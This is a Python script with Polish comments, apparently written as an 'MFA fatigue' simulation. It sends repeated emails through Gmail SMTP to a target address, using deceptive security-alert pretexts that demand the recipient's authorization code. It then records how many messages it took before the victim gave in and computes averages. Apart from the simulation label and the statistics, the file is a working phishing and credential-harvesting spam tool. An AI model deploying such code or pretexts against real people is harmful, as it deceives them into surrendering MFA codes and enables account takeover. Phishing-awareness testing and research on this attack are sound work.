import smtplib
import time
import random
import datetime
import os

# Dane serwera SMTP (dla Gmaila wymaga skonfigurowania "App Passwords")
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_SENDER = "" #twój mail
EMAIL_PASSWORD = "" #app password
EMAIL_RECIPIENT = "" #e-mail atakowanego

# Losowe komunikaty, ktore moga wymusic akceptacje MFA
MFA_MESSAGES = [
    "Rutynowy audyt bezpieczeństwa. Podaj swój kod autoryzacji w celu weryfikacji poziomu zabezpieczeń.",
    "PILNE: Wykryto podejrzane logowanie do Twojego konta. Podaj kod autoryzacji, aby zapobiec wyciekowi danych.",
    "System bezpieczenstwa wymaga weryfikacji MFA. Podaj kod autoryzacji, aby uniknąć wycieku danych.",
    "Twoja firma wymaga autoryzacji do systemu. Podaj kod autoryzacji, aby kontynuowac prace.",
]

# Plik logow do zapisu danych
LOG_FILE = "mfa_fatigue_log.txt"

# Symulacja ataku MFA Fatigue
def send_mfa_spam():
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(EMAIL_SENDER, EMAIL_PASSWORD)

    start_time = datetime.datetime.now()
    reject_count = 0  # Licznik odrzucen

    print("\n--- SYMULACJA MFA FATIGUE ---\n")

    for i in range(20):  # Wysylanie 20 powiadomien
        subject = "MFA Alert: Wymagane dzialanie!"
        body = random.choice(MFA_MESSAGES)
        message = f"Subject: {subject}\nMIME-Version: 1.0\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 8bit\n\n{body}"

        server.sendmail(EMAIL_SENDER, EMAIL_RECIPIENT, message)
        print(f"[{i+1}] Wyslano: {body}")

        # Pytamy uzytkownika, czy zaakceptuje MFA
        response = input("\nCzy uzyskales MFA? (tak/nie): ").strip().lower()

        if response == "tak":
            end_time = datetime.datetime.now()
            elapsed_time = (end_time - start_time).seconds
            print(f"\nUzytkownik zaakceptowal MFA po {reject_count} odrzuceniach i {elapsed_time} sekundach!")

            # Logowanie do pliku
            with open(LOG_FILE, "a") as log_file:
                log_file.write(f"{reject_count},{elapsed_time}\n")

            break  # Konczymy atak
        else:
            reject_count += 1
            print(f"Uzytkownik odrzucil MFA {reject_count} razy. Kontynuujemy atak...\n")

        time.sleep(random.randint(5, 15))

    server.quit()
    print("\nSymulacja zakonczona.")

# Funkcja analizujaca logi
def analyze_logs():
    if not os.path.exists(LOG_FILE):
        print("\nBrak pliku logow. Nie mozna przeprowadzic analizy.")
        return

    reject_counts = []
    elapsed_times = []

    with open(LOG_FILE, "r") as log_file:
        for line in log_file:
            try:
                reject, elapsed = map(int, line.strip().split(","))
                reject_counts.append(reject)
                elapsed_times.append(elapsed)
            except ValueError:
                continue  # Pomija uszkodzone linie

    if not reject_counts:
        print("\nBrak danych do analizy.")
        return

    avg_rejects = sum(reject_counts) / len(reject_counts)
    avg_time = sum(elapsed_times) / len(elapsed_times)
    min_rejects = min(reject_counts)
    max_rejects = max(reject_counts)

    print("\n--- ANALIZA LOGOW ---")
    print(f"Srednia liczba odrzucen MFA: {avg_rejects:.2f}")
    print(f"Sredni czas do zaakceptowania MFA: {avg_time:.2f} sekund")
    print(f"Najmniej odrzucen: {min_rejects}")
    print(f"Najwiecej odrzucen: {max_rejects}")

# Uruchamianie ataku MFA Fatigue
send_mfa_spam()

# Automatyczna analiza logow po zakonczeniu ataku
analyze_logs()
